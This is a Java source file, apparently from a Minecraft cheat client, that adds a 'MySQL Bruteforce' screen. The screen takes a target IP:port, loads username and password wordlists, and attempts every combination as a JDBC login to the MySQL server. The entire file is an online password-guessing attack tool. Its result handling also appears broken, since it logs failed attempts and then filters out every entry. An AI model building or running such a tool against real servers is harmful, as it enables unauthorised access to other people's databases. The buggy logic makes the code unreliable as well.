package wtf.whess.meowware.client.ui.mysqlbrute;

import net.minecraft.client.gui.GuiButton;
import net.minecraft.client.gui.GuiScreen;
import net.minecraft.client.gui.GuiTextField;
import org.lwjgl.input.Keyboard;
import wtf.whess.meowware.client.api.fontmanager.FontManager;

import java.awt.*;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Scanner;

public final class MySQLBruteforce extends GuiScreen {
    private final GuiScreen parentScreen;
    private GuiTextField string;
    private final ArrayList<String> listUsers = new ArrayList<>();
    private final ArrayList<String> listPasswords = new ArrayList<>();

    private final StringBuilder stringBuilder = new StringBuilder();

    private final ArrayList<String> textArea1 = new ArrayList<>(),
                                    textArea2 = new ArrayList<>();

    public MySQLBruteforce(final GuiScreen guiscreen) {
        this.parentScreen = guiscreen;
    }

    @Override
    public void updateScreen() {
        this.string.updateCursorCounter();
    }

    @Override
    public void onGuiClosed() {
        Keyboard.enableRepeatEvents(false);
    }

    @Override
    protected void actionPerformed(final GuiButton guibutton) {
        if (!guibutton.enabled)
            return;
        switch (guibutton.id) {
            case 0: {
                mc.displayGuiScreen(parentScreen);
                break;
            }
            case 1: {
                new Thread(() -> {
                    try {
                        bruteMySQL(string.getText().split(":"));
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }).start();
                break;
            }
        }
    }

    @Override
    protected void keyTyped(final char c, final int i) {
        this.string.textboxKeyTyped(c, i);
        if (c == '\t' && this.string.isFocused()) {
            this.string.setFocused(false);
        }
        if (c == '\r') {
            this.actionPerformed(this.buttonList.get(0));
        }
    }

    @Override
    protected void mouseClicked(final int i, final int j, final int k) throws IOException {
        super.mouseClicked(i, j, k);
        this.string.mouseClicked(i, j, k);
    }

    @Override
    public void initGui() {
        Keyboard.enableRepeatEvents(true);
        this.buttonList.clear();
        this.buttonList.add(new GuiButton(1, width / 2 - 100, height / 4 + 74 + 40, "Brute"));
        this.buttonList.add(new GuiButton(0, width / 2 - 100, height / 4 + 85 + 60, "Cancel"));
        this.string = new GuiTextField(3, this.fontRendererObj, width / 2 - 100, 116, 200, 20);
    }

    public void bruteMySQL(final String[] splitS) throws IOException {
        final String host = splitS[0];
        final int port = Integer.parseInt(splitS[1]);
        final File users = new File("/MeowWare/mysqlbrute/users.txt");
        final File passwords = new File("/MeowWare/mysqlbrute/passwords.txt");
        if (!passwords.exists())
            if (!passwords.createNewFile())
                throw new RuntimeException();
        if (!users.exists())
            if (!users.createNewFile())
                throw new RuntimeException();
        final Scanner in = new Scanner(new FileReader(users));
        this.listUsers.clear();
        this.listPasswords.clear();
        while (in.hasNext())
            this.listUsers.add(in.next());
        final Scanner in2 = new Scanner(new FileReader(passwords));
        while (in2.hasNext()) {
            this.listPasswords.add(in2.next());
            System.out.println(this.listPasswords.size());
        } for (final String user : this.listUsers) {
            for (String password : this.listPasswords) {
                if ("%empty%".equals(password)) {
                    password = "";
                } try {
                    this.textArea2.add(splitS[0] + ":" + splitS[1] + ":" + user + ":" + password);
                    Connection connection = null;
                    try {
                        connection = DriverManager.getConnection("jdbc:mysql://" + host + ":" + port, user, password);
                    } catch (final SQLException ignored) {}
                    if (connection == null)
                        this.textArea1.add(splitS[0] + ":" + splitS[1] + ":" + user + ":" + password);
                } catch (final Exception var9) {
                    var9.printStackTrace();
                }
            }
        }
    }

    @Override
    public void drawScreen(final int i, final int j, final float f) {
        assert FontManager.montserratLight18 != null;
        drawDefaultBackground();
        for (String s: textArea1) {
            if (!textArea2.contains(s))
                stringBuilder.append(s);
        } this.string.drawTextBox();
        FontManager.montserratLight18.drawString(!this.string.getText().isEmpty() ? "" : "IP:Port", width / 2F - 95, 120, Color.gray.getRGB());
        FontManager.montserratLight18.drawString(stringBuilder.toString(), width / 2F - 115, 120, Color.gray.getRGB());
        super.drawScreen(i, j, f);
    }
}
